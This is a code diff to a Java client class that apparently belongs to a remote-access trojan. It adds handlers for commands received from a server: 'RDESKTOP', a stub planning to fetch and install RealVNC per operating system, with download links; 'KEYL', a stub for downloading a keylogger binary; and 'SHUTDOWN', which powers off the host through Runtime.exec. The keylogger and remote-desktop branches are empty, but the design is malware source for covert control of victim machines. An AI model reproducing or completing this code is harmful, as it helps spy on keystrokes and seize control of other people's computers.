@@ -351,6 +351,39 @@ public class Client {
                         communicate(status);
                     }
                     communicate(1);
+                } else if (input.contains("RDESKTOP")){
+                    /*
+                    RealVNC Server
+                    Linux: https://www.realvnc.com/download/file/vnc.files/VNC-Server-6.4.0-Linux-x64-ANY.tar.gz
+                    Windows: https://www.realvnc.com/download/file/vnc.files/VNC-Server-6.4.0-Windows.exe
+                    Mac: https://www.realvnc.com/download/file/vnc.files/VNC-Server-6.4.0-MacOSX-x86_64.pkg
+                     */
+                    if (SYSTEMOS.contains("wind")){
+                        // Download windows
+                    } else if (SYSTEMOS.contains("lin")){
+                        // Linux
+                    } else {
+                        // Mac
+                    }
+                } else if (input.contains("KEYL")){
+                    // Download binary depending on os
+                    if (SYSTEMOS.contains("wind")){
+                        // Download windows
+                    } else if (SYSTEMOS.contains("lin")){
+                        // Linux
+                    } else {
+                        // Mac
+                    }
+                } else if (input.equals("SHUTDOWN")){
+                    communicate("EXIT"); // Tell server that client is leaving
+                    socket.close();
+                    if (SYSTEMOS.contains("wind")){
+                        Runtime.getRuntime().exec("shutdown.exe -s -t 0");
+                    } else {
+                        //linux or mac
+                        Runtime.getRuntime().exec("shutdown -h now");
+                    }
+
                 }
             }
         } catch (Exception e) {
